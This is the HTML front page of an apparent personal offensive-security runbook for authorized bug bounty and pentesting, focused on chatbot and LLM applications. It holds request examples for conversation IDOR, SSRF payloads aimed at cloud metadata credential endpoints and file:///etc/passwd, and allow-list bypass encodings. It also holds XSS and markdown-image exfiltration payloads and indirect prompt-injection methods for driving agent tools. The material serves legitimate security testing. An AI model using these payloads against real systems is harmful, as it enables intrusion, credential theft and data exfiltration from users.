@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>0xsh4n · Offensive Security Runbook</title>
+<meta name="description" content="A working field runbook for bug bounty AND pentesting — web, modern Node/React/SSR, server-side, API, cloud (AWS/Azure), Android, iOS, thick-client and OT/ICS. 1000+ checks, searchable, scope-filterable, with concrete requests.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;500;700&family=Ubuntu+Mono:wght@400;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="assets/css/style.css">
+</head>
+<body>
+<button class="menu-btn" id="menuBtn" aria-label="Menu">☰</button>
+<div class="scrim" id="scrim"></div>
+<div class="shell">
+
+  <aside id="side">
+    <div class="brand">
+      <div class="mk">&gt;_</div>
+      <div>
+        <b>0xsh4n</b>
+        <span>offensive security runbook</span>
+      </div>
+      <button class="themebtn" id="themeBtn" title="Toggle light / dark" aria-label="Toggle theme">☾</button>
+    </div>
+
+    <div class="sbsearch"><input id="sbsearch" type="search" placeholder="Jump to a module…" aria-label="Filter modules"></div>
+
+    <nav class="modnav" id="modnav"><!-- built by app.js --></nav>
+
+    <div class="gprog">
+      <div class="track"><i id="gbar"></i></div>
+      <div class="lbl"><span id="glbl">0 / 0 done</span><button class="reset" id="resetBtn">reset</button></div>
+    </div>
+  </aside>
+
+  <div>
+    <div class="topnav" id="topnav">
+      <div class="crumb" id="crumb"></div>
+      <div class="scope" role="group" aria-label="Scope filter">
+        <span class="shdr">scope</span>
+        <button data-sc="all" title="Everything">All</button>
+        <button data-sc="bb" title="Bug-bounty-relevant findings">Bug Bounty</button>
+        <button data-sc="pt" title="Full pentest — includes config / hygiene findings">Pentest</button>
+      </div>
+    </div>
+
+    <main>
+      <!-- ============ HOME / OVERVIEW ============ -->
+      <div class="panel on" id="p-home"></div>
+
+      <!-- ============ TARGET PLANNER ============ -->
+      <div class="panel" id="p-target">
+        <div class="mhead" style="--cat:var(--accent)">
+          <p class="mcat"><span class="cdot"></span>Engagement planner</p>
+          <h2>Target planner</h2>
+          <p class="sub">Enter a <b>domain</b>, <b>IP</b>, or <b>URL</b> and get a tailored, copy-ready methodology — phased recon, enumeration and the exact checks to run, wired to the modules in this runbook. Everything runs in <b>your</b> authorized environment; this page builds the plan, it does not scan.</p>
+        </div>
+        <div class="planform">
+          <input id="tgtInput" class="search" style="padding-left:15px" placeholder="e.g. target.com  ·  10.0.0.5  ·  https://app.target.com/api" aria-label="Target">
+          <div class="planopts" id="planopts">
+            <label><input type="checkbox" value="web" checked> Web app</label>
+            <label><input type="checkbox" value="api" checked> API</label>
+            <label><input type="checkbox" value="net" checked> Network / infra</label>
+            <label><input type="checkbox" value="cloud"> Cloud</label>
+            <label><input type="checkbox" value="mobile"> Mobile</label>
+            <label><input type="checkbox" value="ai"> AI / LLM</label>
+          </div>
+          <div class="planbtns">
+            <button class="genbtn" id="genPlan">Generate plan →</button>
+            <span class="planhint" id="planhint"></span>
+          </div>
+        </div>
+        <div id="planout"></div>
+      </div>
+
+      <!-- ============ CHATBOT / LLM RUNBOOK (AI category) ============ -->
+      <div class="panel" id="p-chatbot">
+        <header class="hero">
+          <p class="eyebrow">// recon → report · authorized testing only</p>
+          <h1>Testing chatbots where the<br>bounties actually live. <span class="q">everything else too.</span></h1>
+          <p class="lede">Most reports pile onto the chat box. The paid findings sit in the API, the output renderer, the retrieval layer and the tool calls around the model. This is the working runbook — plus 1000+ checks across web, modern Node/React/SSR, server-side, API, cloud, mobile, thick-client and OT.</p>
+          <div class="term" aria-hidden="true">
+            <div class="bar"><i></i><i></i><i></i><b>~/engagement</b></div>
+            <div class="body">
+              <div><span class="p">$</span> ./scope --target chatbot --map api</div>
+              <div><span class="o">→ transport: SSE + REST · auth: bearer</span></div>
+              <div><span class="p">$</span> ./classify --arch</div>
+              <div><span class="o">→ [ rag ] [ agent ] [ plain-llm ] ?</span></div>
+              <div><span class="p">$</span> ./hunt --idor --ssrf --output-handling<span class="cur"></span></div>
+            </div>
+          </div>
+          <div class="note"><span class="ic">!</span><div><b>Rules of engagement.</b> Test only what the program authorizes. Confirm policy on automated scanning and resource-exhaustion ("denial of wallet") testing. If you hit real user PII: stop, capture minimal proof, redact, report — don't exfiltrate beyond what proves impact.</div></div>
+        </header>
+
+        <section id="recon">
+          <div class="phase-h"><span class="idx">01</span><h2>Recon &amp; fingerprint</h2></div>
+          <p class="sub">The visible widget hides the target. Get everything on a proxy and map the real API before touching the model.</p>
+          <h3>Capture the plumbing</h3>
+          <ul class="ck">
+            <li><span class="box"></span><span class="txt">Proxy all traffic through <b>Burp / Caido / mitmproxy</b> — the UI is not the target, the API is.</span></li>
+            <li><span class="box"></span><span class="txt">Identify transport: REST, GraphQL, <b>SSE</b>, or <b>WebSocket</b> (streaming bots usually stream).</span></li>
+            <li><span class="box"></span><span class="txt">Map every endpoint: send, list, get, delete, rename, <b>share</b>, export, upload, feedback, regenerate.</span></li>
+            <li><span class="box"></span><span class="txt">Pull the frontend JS bundle — hunt endpoints, feature flags, model names, and <b>leaked provider API keys</b>.</span></li>
+            <li><span class="box"></span><span class="txt">Record auth: session cookie, JWT, API key, or unauthenticated.</span></li>
+          </ul>
+          <h3>Fingerprint model &amp; capabilities</h3>
+          <ul class="ck">
+            <li><span class="box"></span><span class="txt">Refusal phrasing, token limits and error shapes leak the provider (OpenAI / Anthropic / Google / self-hosted).</span></li>
+            <li><span class="box"></span><span class="txt">Enumerate surface-expanding features: <b>file upload</b>, <b>URL fetch / preview</b>, <b>code exec</b>, <b>tools/actions</b>, <b>memory</b>, <b>multi-tenant</b>.</span></li>
+          </ul>
+        </section>
+
+        <section id="classify">
+          <div class="phase-h"><span class="idx">02</span><h2>Classify the architecture</h2></div>
+          <p class="sub">Your step one. Plain LLM vs RAG vs Agent — each unlocks a different bug class, and systems are often more than one.</p>
+          <h3>Signals — RAG</h3>
+          <ul class="ck">
+            <li><span class="box"></span><span class="txt">Cites internal docs / KB / tickets, or answers <b>private &amp; recent</b> data a base model couldn't know.</span></li>
+            <li><span class="box"></span><span class="txt"><b>Test:</b> ask for something only an ingested doc would contain vs. something generic — compare specificity.</span></li>
+          </ul>
+          <h3>Signals — Agent / tools</h3>
+          <ul class="ck">
+            <li><span class="box"></span><span class="txt">It <b>does things</b>: fetches a URL, runs math, looks up an order, queries live state.</span></li>
+            <li><span class="box"></span><span class="txt"><b>Test:</b> ask it to fetch a URL you control → a hit on your OOB listener means it has an HTTP tool (and maybe SSRF). One move classifies it <i>and</i> starts the SSRF test.</span></li>
+          </ul>
+          <div class="callout">Once classified, prioritise RAG and/or Agent tracks — but always run app-layer, output-handling and disclosure checks regardless of type.</div>
+        </section>
+
+        <section id="applayer">
+          <div class="phase-h"><span class="idx">03</span><h2>App-layer testing</h2></div>
+          <p class="sub">The chatbot is still a web app. The LLM hype makes people skip the classics — that's your edge.</p>
+          <div class="tags"><span class="sev high">high-value</span><span class="tag owasp">LLM06 Excessive Agency</span><span class="tag">BOLA</span><span class="tag">SSRF</span></div>
+          <h3>Access control / IDOR / BOLA</h3>
+          <ul class="ck">
+            <li><span class="box"></span><span class="txt">Swap <code>conversation_id</code> / <code>thread_id</code> / <code>message_id</code> / <code>file_id</code> in get, history, delete, rename, share, export → read others' chats.</span></li>
+            <li><span class="box"></span><span class="txt"><b>Share links:</b> guessable, unexpired, or missing-authz <code>/share/{token}</code>?</span></li>
+            <li><span class="box"></span><span class="txt"><b>Tenant isolation:</b> can org A reach org B's conversations, files, or RAG docs?</span></li>
+          </ul>
+          <h3>Injection, SSRF, uploads, limits</h3>
+          <ul class="ck">
+            <li><span class="box"></span><span class="txt">Where does model <b>output</b> flow? Into SQL / NoSQL / shell / template / another API → steer it to emit a payload.</span></li>
+            <li><span class="box"></span><span class="txt"><b>SSRF</b> via URL-fetch / preview / image / RAG-ingest — <code>169.254.169.254</code>, internal IPs, <code>file://</code>.</span></li>
+            <li><span class="box"></span><span class="txt">Upload: traversal, XXE (DOCX/SVG/PDF), SSRF/RCE via processors. See the <b>File Upload</b> module.</span></li>
+            <li><span class="box"></span><span class="txt"><b>Denial-of-wallet:</b> missing rate limits, max-token abuse, unbounded concurrency <i>(if allowed)</i>.</span></li>
+            <li><span class="box"></span><span class="txt">CORS reflection + credentials; WebSocket origin/auth; GraphQL introspection &amp; field authz.</span></li>
+          </ul>
+        </section>
+
+        <section id="output">
+          <div class="phase-h"><span class="idx">04</span><h2>Insecure output handling</h2></div>
+          <p class="sub">Model output is untrusted input to the browser. How the UI renders it is a goldmine — and under-tested.</p>
+          <div class="tags"><span class="sev high">high-value</span><span class="tag owasp">LLM05 Improper Output Handling</span></div>
+          <ul class="ck">
+            <li><span class="box"></span><span class="txt"><b>XSS via rendered markdown/HTML:</b> steer output to <code>&lt;img src=x onerror=&gt;</code>, <code>javascript:</code> links, HTML that escapes the renderer.</span></li>
+            <li><span class="box"></span><span class="txt"><b>Markdown image data-exfil:</b> if it renders <code>![](https://you/?d=DATA)</code> that's an exfil primitive — chain with indirect injection. Confirm on your OOB.</span></li>
+            <li><span class="box"></span><span class="txt"><b>Stored reach:</b> output reflected on shared-transcript pages, admin dashboards or emails → stored XSS hitting new victims.</span></li>
+          </ul>
+        </section>
+
+        <section id="agent">
+          <div class="phase-h"><span class="idx">05</span><h2>Agent / tools &amp; disclosure</h2></div>
+          <p class="sub">Excessive agency + what leaks. Info disclosure, not banter — report the leak.</p>
+          <div class="tags"><span class="sev crit">critical path</span><span class="tag owasp">LLM06</span><span class="tag owasp">LLM07 System Prompt Leakage</span></div>
+          <ul class="ck">
+            <li><span class="box"></span><span class="txt"><b>Enumerate tools</b> and their parameters; trigger a state-changing tool without authz or on <b>another user's</b> resource.</span></li>
+            <li><span class="box"></span><span class="txt"><b>Parameter injection:</b> steer <code>get_order(id)</code> to another user's ID — IDOR/SSRF <i>through</i> the tool call.</span></li>
+            <li><span class="box"></span><span class="txt"><b>Indirect injection → action:</b> ingested content that makes the agent <i>do</i> something (account takeover via agent).</span></li>
+            <li><span class="box"></span><span class="txt"><b>Leaked provider API keys</b> in the JS bundle — billed to the target, trivial to prove without abuse. <span class="sev crit">crit</span></span></li>
+            <li><span class="box"></span><span class="txt">System-prompt leakage exposing rules, tool schemas, internal URLs or secrets; verbose errors with stack traces.</span></li>
+          </ul>
+        </section>
+
+        <!-- IDOR RUNBOOK -->
+        <section id="rb-idor">
+          <div class="phase-h"><span class="idx">RB</span><h2>Runbook — Conversation IDOR / BOLA</h2></div>
+          <p class="sub">Read or modify another user's conversations, messages, files or share links. Pure web-app testing, no LLM knowledge required — one of the most recurring high-value chatbot bugs.</p>
+          <div class="tags"><span class="sev high">high → crit</span><span class="tag owasp">LLM02 Sensitive Info</span><span class="tag">Broken Object-Level Auth</span><span class="tag">Burp · Autorize</span></div>
+
+          <div class="step"><div class="num">1</div><div class="c">
+            <h4>Baseline your own traffic</h4>
+            <p>Two accounts — <code>A</code> (attacker), <code>B</code> (victim). Send a message as each and capture the get-conversation request. Note the object ID and its format.</p>
+            <div class="code"><div class="head"><span class="lbl">A — legitimate request</span><button class="copy">copy</button></div>
+<pre><span class="k">GET</span> <span class="u">/api/v1/conversations/6f2c9a41-7b3e-4d02-9c8a-1f0e2b3c4d5e</span> HTTP/2
+<span class="m">Host:</span> chat.target.com
+<span class="m">Authorization:</span> Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVC...   <span class="m"># A's token</span>
+<span class="m">Cookie:</span> session=A-SESSION</pre></div>
+            <p><code>UUIDv4</code> = not enumerable but still test authz; sequential <code>int</code> / <code>UUIDv1</code> = enumerable.</p>
+          </div></div>
+
+          <div class="step"><div class="num">2</div><div class="c">
+            <h4>Swap the object ID, keep your own auth</h4>
+            <p>In Repeater, replace the ID with B's while keeping <b>A's</b> token. B's content back → IDOR/BOLA.</p>
+            <div class="code"><div class="head"><span class="lbl">A's token · B's object → does it leak?</span><button class="copy">copy</button></div>
+<pre><span class="k">GET</span> <span class="u">/api/v1/conversations/</span><span class="r">a1b2c3d4-victim-conversation-id</span> HTTP/2
+<span class="m">Host:</span> chat.target.com
+<span class="m">Authorization:</span> Bearer <span class="g">eyJ...A-TOKEN...</span>          <span class="m"># still A</span>
+
+<span class="m"># 200 + B's messages  → IDOR confirmed</span>
+<span class="m"># 403 / 404           → authz enforced, move on</span></pre></div>
+          </div></div>
+
+          <div class="step"><div class="num">3</div><div class="c">
+            <h4>Cover every verb &amp; sibling endpoint</h4>
+            <div class="code"><div class="head"><span class="lbl">replay each with a foreign ID</span><button class="copy">copy</button></div>
+<pre><span class="k">GET</span>    /api/v1/conversations/{id}              <span class="m"># read transcript</span>
+<span class="k">GET</span>    /api/v1/conversations/{id}/messages     <span class="m"># full history</span>
+<span class="k">PATCH</span>  /api/v1/conversations/{id}              <span class="m"># rename / tamper</span>
+<span class="k">DELETE</span> /api/v1/conversations/{id}              <span class="m"># destroy</span>
+<span class="k">POST</span>   /api/v1/conversations/{id}/share        <span class="m"># force-share</span>
+<span class="k">GET</span>    /api/v1/conversations/{id}/export       <span class="m"># bulk pull</span>
+<span class="k">GET</span>    /api/v1/files/{file_id}                 <span class="m"># attachment IDOR</span></pre></div>
+            <div class="callout"><b>Share links</b> are their own bug: test <code>/share/{token}</code> unauthenticated, whether tokens are short/sequential/guessable, and whether they ever expire.</div>
+          </div></div>
+
+          <div class="step"><div class="num">4</div><div class="c">
+            <h4>Automate the auth diff with Autorize</h4>
+            <div class="code"><div class="head"><span class="lbl">Autorize setup</span><button class="copy">copy</button></div>
+<pre><span class="m"># 1</span> Paste user B's token/cookie into Autorize (the <span class="g">low-priv</span> identity).
+<span class="m"># 2</span> Browse the whole app as user <span class="g">A</span>.
+<span class="m"># 3</span> Autorize replays each A-request with B's identity and diffs:
+     <span class="g">green "Bypassed!"</span>   → missing object-level authz
+     <span class="m">grey  "Enforced!"</span>   → ok
+     orange "Is enforced??" → verify manually</pre></div>
+            <div class="code"><div class="head"><span class="lbl">Intruder — enumerate integer IDs</span><button class="copy">copy</button></div>
+<pre><span class="k">GET</span> /api/v1/conversations/<span class="r">§1000§</span> HTTP/2
+<span class="m">Authorization:</span> Bearer eyJ...A-TOKEN...
+<span class="m"># payload: numbers · grep distinct user data · flag differing 200s</span></pre></div>
+          </div></div>
+
+          <div class="step"><div class="num">5</div><div class="c">
+            <h4>Prove impact, then stop</h4>
+            <p>Evidence = victim-specific content your account could never see (their message text, their email). Screenshot the request/response, <b>redact real PII</b>, state scope. Don't mass-enumerate real users — one clean cross-account read proves it.</p>
+          </div></div>
+        </section>
+
+        <!-- SSRF RUNBOOK -->
+        <section id="rb-ssrf">
+          <div class="phase-h"><span class="idx">RB</span><h2>Runbook — SSRF via URL-fetch &amp; tools</h2></div>
+          <p class="sub">Make the server request internal or attacker-chosen destinations via any fetch/preview/ingest feature — or through an agent's URL tool. Often chains straight to cloud-metadata credential theft.</p>
+          <div class="tags"><span class="sev crit">critical</span><span class="tag owasp">LLM06 Excessive Agency</span><span class="tag">Collaborator / interactsh</span></div>
+
+          <div class="step"><div class="num">1</div><div class="c">
+            <h4>Find the sink</h4>
+            <p>Any feature that makes the backend reach a URL: "summarise this link", link unfurl/preview, image-from-URL / avatar, RAG "ingest this URL", webhook config, or an agent <code>fetch_url</code> tool.</p>
+          </div></div>
+          <div class="step"><div class="num">2</div><div class="c">
+            <h4>Confirm the fetch with OOB</h4>
+            <div class="code"><div class="head"><span class="lbl">bait the fetch</span><button class="copy">copy</button></div>
+<pre><span class="k">POST</span> <span class="u">/api/v1/chat</span> HTTP/2
+<span class="m">Content-Type:</span> application/json
+
+{<span class="m">"message"</span>: <span class="g">"summarise https://a1b2c3.oastify.com/ssrf"</span>}</pre></div>
+            <div class="callout"><b>DNS + HTTP hit</b> on your listener = server-side fetch confirmed. Record the <b>source IP</b> and <b>User-Agent</b> — they reveal cloud infra, an egress proxy, or the fetch library.</div>
+          </div></div>
+          <div class="step"><div class="num">3</div><div class="c">
+            <h4>Pivot inward</h4>
+            <div class="code"><div class="head"><span class="lbl">internal targets</span><button class="copy">copy</button></div>
+<pre><span class="m"># AWS IMDSv1</span>
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+<span class="m"># GCP  (header: Metadata-Flavor: Google)</span>
+http://metadata.google.internal/computeMetadata/v1/
+<span class="m"># Azure (header: Metadata: true)</span>
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+<span class="m"># internal services / schemes</span>
+http://127.0.0.1:8080/ · http://localhost/admin · file:///etc/passwd</pre></div>
+          </div></div>
+          <div class="step"><div class="num">4</div><div class="c">
+            <h4>Bypass allow-lists</h4>
+            <div class="code"><div class="head"><span class="lbl">filter bypasses</span><button class="copy">copy</button></div>
+<pre>http://2130706433/    <span class="m">(decimal 127.0.0.1)</span>
+http://0x7f000001/    <span class="m">(hex)</span>
+http://[::ffff:169.254.169.254]/
+http://127.0.0.1.nip.io/  ·  http://localhost./
+http://169.254.169.254<span class="r">@</span>your.com/  ·  http://your.com<span class="r">#@</span>169.254.169.254/
+<span class="m"># or: your server 302-redirects to the internal target</span></pre></div>
+          </div></div>
+          <div class="step"><div class="num">5</div><div class="c">
+            <h4>Read the response back &amp; escalate responsibly</h4>
+            <p>If the bot echoes fetched content, ask for it — the model reads the internal response straight back. Capture the OOB log + reflected body, <b>redact live credentials</b>, note the chain (SSRF → metadata → cloud takeover) as impact without actually pivoting.</p>
+            <div class="callout warn"><b>Denial-of-wallet cousin:</b> a fetch with no size/redirect cap can be pointed at a huge file or a redirect loop — only test if the program allows it.</div>
+          </div></div>
+        </section>
+
+        <section id="owasp">
+          <div class="phase-h"><span class="idx">::</span><h2>OWASP LLM Top 10 (2025)</h2></div>
+          <p class="sub">Tag every finding so reviewers place it instantly.</p>
+          <table class="map"><thead><tr><th>ID</th><th>Category</th><th>Where it shows up</th></tr></thead><tbody>
+            <tr><td><code>LLM01</code></td><td>Prompt Injection</td><td>Indirect-injection glue — output &amp; RAG</td></tr>
+            <tr><td><code>LLM02</code></td><td>Sensitive Information Disclosure</td><td>IDOR runbook, RAG, disclosure</td></tr>
+            <tr><td><code>LLM03</code></td><td>Supply Chain</td><td>Recon — leaked keys / deps</td></tr>
+            <tr><td><code>LLM04</code></td><td>Data &amp; Model Poisoning</td><td>Writable RAG sources</td></tr>
+            <tr><td><code>LLM05</code></td><td>Improper Output Handling</td><td>Output-handling XSS / exfil</td></tr>
+            <tr><td><code>LLM06</code></td><td>Excessive Agency</td><td>Agent tools + SSRF runbook</td></tr>
+            <tr><td><code>LLM07</code></td><td>System Prompt Leakage</td><td>Disclosure</td></tr>
+            <tr><td><code>LLM08</code></td><td>Vector &amp; Embedding Weaknesses</td><td>RAG</td></tr>
+            <tr><td><code>LLM09</code></td><td>Misinformation</td><td>Logic / trust context</td></tr>
+            <tr><td><code>LLM10</code></td><td>Unbounded Consumption</td><td>Denial-of-wallet</td></tr>
+          </tbody></table>
+        </section>
+      </div>
+
+      <!-- ============ DATA MODULES / CATEGORY LANDINGS (rendered) ============ -->
+      <div class="panel" id="p-data"></div>
+
+      <!-- ============ ABOUT ============ -->
+      <div class="panel" id="p-about">
+        <div class="mhead"><h2>About &amp; deploy</h2>
+          <p class="sub">A personal field runbook for <b>bug bounty and pentesting</b> — the hand-written chatbot/LLM methodology plus 1000+ checks across Web (incl. modern Node/React/SSR and server-side), API, Cloud (AWS/Azure), Android, iOS, Thick Client and OT/ICS. Everything is client-side; your checkbox progress, theme and scope live in your browser only.</p>
+        </div>
+        <section>
+          <h3>How to use it</h3>
+          <ul class="ck">
+            <li><span class="box"></span><span class="txt"><b>Categories → modules</b> in the sidebar: Web, Android, iOS, Thick Client, Cloud, OT. Click a category for its landing cards, or a module to open its checklist.</span></li>
+            <li><span class="box"></span><span class="txt"><b>Scope filter</b> (top bar): <b>Bug Bounty</b> hides low-value config/hygiene items; <b>Pentest</b> shows everything (cookie flags, user enumeration, missing headers, TLS…); <b>All</b> = no filter.</span></li>
+            <li><span class="box"></span><span class="txt"><b>Stack tags</b> (PHP · Node · React · .NET …) flag where a technique or payload changes by stack — filter by them inside a module.</span></li>
+            <li><span class="box"></span><span class="txt">Per-module <b>search</b> + <b>severity</b> chips; tick items to track progress (saved in <code>localStorage</code>).</span></li>
+          </ul>
+        </section>
+        <section>
+          <h3>Deploy to GitHub Pages</h3>
+          <div class="code"><div class="head"><span class="lbl">0xsh4n.github.io/bugbounty-methodology</span><button class="copy">copy</button></div>
+<pre>git add index.html assets data
+git commit -m "offensive security runbook"
+git push -u origin main
+<span class="m"># then: repo → Settings → Pages → Deploy from branch → main / root</span></pre></div>
+          <p class="sub">Static files only — <code>index.html</code> + <code>assets/</code> (css, js) + <code>data/</code> (one file per module). Relative paths, so the <code>/bugbounty-methodology</code> subpath works with no config. Fonts load from Google Fonts.</p>
+          <div class="callout">Built for <b>authorized</b> testing only. Map findings to the relevant list (OWASP Web / API / LLM / MASVS / IEC&nbsp;62443) and lead reports with impact.</div>
+        </section>
+      </div>
+
+      <footer>0xsh4n · offensive security runbook · bug bounty + pentest · authorized testing only · progress saved locally in <code>localStorage</code></footer>
+    </main>
+  </div>
+</div>
+
+<!-- registry first, then one file per module, then the app -->
+<script src="data/_registry.js"></script>
+<script src="data/aisec.js"></script>
+<script src="data/dast.js"></script>
+<script src="data/api.js"></script>
+<script src="data/modernweb.js"></script>
+<script src="data/serverside.js"></script>
+<script src="data/js.js"></script>
+<script src="data/fileupload.js"></script>
+<script src="data/pentest.js"></script>
+<script src="data/web3.js"></script>
+<script src="data/android.js"></script>
+<script src="data/ios.js"></script>
+<script src="data/network.js"></script>
+<script src="data/thickclient.js"></script>
+<script src="data/aws.js"></script>
+<script src="data/azure.js"></script>
+<script src="data/gcp.js"></script>
+<script src="data/ot.js"></script>
+<script src="assets/js/app.js"></script>
+</body>
+</html>
